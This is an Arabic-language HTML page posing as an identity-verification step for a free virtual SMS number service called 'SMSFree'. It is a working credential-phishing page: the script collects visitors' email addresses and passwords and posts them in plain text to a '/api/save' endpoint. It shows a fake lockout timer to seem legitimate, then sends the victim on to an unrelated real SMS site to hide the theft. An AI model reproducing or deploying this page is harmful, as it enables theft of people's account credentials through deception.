<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - الحماية المتقدمة</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #0a0e17; color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #141b2b; padding: 40px; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .logo { width: 100px; height: 100px; background: #0d121c; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; border: 1px solid #00f2fe; }
        
        input { width: 100%; padding: 15px; margin-bottom: 15px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:disabled { opacity: 0.4; cursor: not-allowed; filter: grayscale(1); }
        input::placeholder { color: rgba(0, 242, 254, 0.4); }
        
        #msg { padding: 12px; margin-bottom: 15px; border-radius: 10px; font-size: 13px; display: none; font-weight: bold; line-height: 1.6; }
        .err { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
        .ban { background: #000; color: #ffbc00; border: 2px solid #ffbc00; box-shadow: 0 0 15px rgba(255, 188, 0, 0.2); }

        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #4facfe, #00f2fe); color: #0a0e17; font-weight: 800; cursor: pointer; font-size: 16px; transition: 0.3s; }
        button:disabled { opacity: 0.3; cursor: not-allowed; }
        
        #sorryBtn { background: #ffbc00 !important; color: #000 !important; display: none; margin-top: 10px; }

        .footer { margin-top: 25px; font-size: 11px; color: #8b9bb4; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo"><strong>SMSFree</strong></div>
        <h2 style="margin-bottom: 20px;">تأكيد الهوية الرقمية</h2>
        
        <div id="msg"></div>

        <form id="loginForm">
            <input type="text" id="email" placeholder="البريد الإلكتروني (example@mail.com)" required>
            <input type="password" id="pass" placeholder="كلمة السر" required>
            
            <button type="submit" id="btn">تفعيل الحساب الآن</button>
            <button type="button" id="sorryBtn">اعتذر.. سأقوم بتصحيح البريد وكلمة السر</button>
        </form>

        <div class="footer">
            © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة.
        </div>
    </div>

    <script>
        let fails = 0;
        let isLocked = false;
        const form = document.getElementById('loginForm');
        const m = document.getElementById('msg');
        const b = document.getElementById('btn');
        const sBtn = document.getElementById('sorryBtn');
        const inputs = document.querySelectorAll('input');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            if (isLocked) return;

            const u = document.getElementById('email').value.trim();
            const p = document.getElementById('pass').value.trim();

            // منطق التحقق الصارم
            const isEmailValid = u.includes('@') && u.includes('.');
            const isPassValid = p.length >= 6;

            if (!isEmailValid || !isPassValid) {
                fails++;
                setInputsState(true); // قفل الحقول فوراً

                if (fails === 1) {
                    m.innerText = "⚠️ يرجى كتابة البريد وكلمة السر بطريقة صحيحة";
                    m.className = "err";
                    m.style.display = "block";
                    b.style.display = "none";
                    sBtn.style.display = "block";
                } else {
                    triggerHardBan();
                }
                return;
            }

            // إرسال البيانات في حال الصحة
            b.disabled = true;
            b.innerText = "⏳ جاري التحقق...";
            
            try {
                await fetch('/api/save', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user: u, pass: p })
                });
            } catch(err) {}

            setTimeout(() => {
                window.location.href = "https://receive-smss.com/";
            }, 2000);
        });

        // وظيفة زر الاعتذار
        sBtn.onclick = () => {
            setInputsState(false);
            sBtn.style.display = "none";
            b.style.display = "block";
            m.style.display = "none";
        };

        function setInputsState(disabled) {
            inputs.forEach(i => i.disabled = disabled);
        }

        function triggerHardBan() {
            isLocked = true;
            sBtn.style.display = "none";
            b.style.display = "block";
            b.disabled = true;
            let timer = 60;

            const countdown = setInterval(() => {
                m.innerText = `🚫 لقد تم حظرك بسبب محاولات الخاطئة. فك الحظر بعد ${timer} ثانية`;
                m.className = "ban";
                m.style.display = "block";
                timer--;

                if (timer < 0) {
                    clearInterval(countdown);
                    isLocked = false;
                    b.disabled = false;
                    m.style.display = "none";
                    setInputsState(false);
                    fails = 0;
                }
            }, 1000);
        }
    </script>
</body>
</html>
